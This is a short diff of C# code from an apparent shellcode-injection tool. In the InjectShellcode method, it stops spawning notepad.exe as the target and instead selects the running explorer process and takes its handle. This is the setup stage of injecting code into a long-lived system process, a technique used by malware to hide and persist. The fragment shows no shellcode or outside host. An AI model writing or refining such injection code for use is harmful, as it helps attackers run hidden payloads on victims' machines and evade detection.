@@ -46,10 +46,10 @@ namespace Inject
         public static void InjectShellcode()
         {
 
-            ProcessStartInfo startInfo = new ProcessStartInfo("notepad.exe");
-            Process notepadProcess = Process.Start(startInfo);
-            Thread.Sleep(3000);
-            Process[] targetProcess = Process.GetProcessesByName("notepad");
+            // ProcessStartInfo startInfo = new ProcessStartInfo("notepad.exe");
+            // Process notepadProcess = Process.Start(startInfo);
+            // Thread.Sleep(3000);
+            Process[] targetProcess = Process.GetProcessesByName("explorer");
             IntPtr htargetProcess = targetProcess[0].Handle;
 
             IntPtr hProcess = IntPtr.Zero;
